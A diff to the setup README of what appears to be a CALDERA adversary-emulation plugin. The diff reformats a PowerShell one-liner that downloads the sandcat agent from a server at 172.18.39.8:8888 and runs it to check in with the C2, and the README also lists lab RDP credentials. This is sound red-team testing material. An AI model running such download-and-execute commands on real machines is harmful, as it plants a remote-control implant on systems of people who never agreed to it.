@@ -49,10 +49,7 @@ Please read the [full documentation](https://github.com/mitre/caldera/wiki/Plugi
 2. RDP to the public ip of IT001.shire.com
    * Login - pgustavo:W1n1!2019
    * Launch an admin CMD and a non-admin PowerShell
-   * Execute the PowerShell command:    
-      ```
-$url="http://172.18.39.8:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);C:\Users\Public\sandcat.exe -server http://172.18.39.8:8888 -group evals_caldera -v;
-      ```
+   * Execute the PowerShell command: `$url="http://172.18.39.8:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);C:\Users\Public\sandcat.exe -server http://172.18.39.8:8888 -group evals_caldera -v;`
    * The 54ndc47 agent should now be checked in with CALDERA (172.18.39.8)
 
 3. Browse to the CALDERA UI `(http://CALDERAPublicIp:8888)`
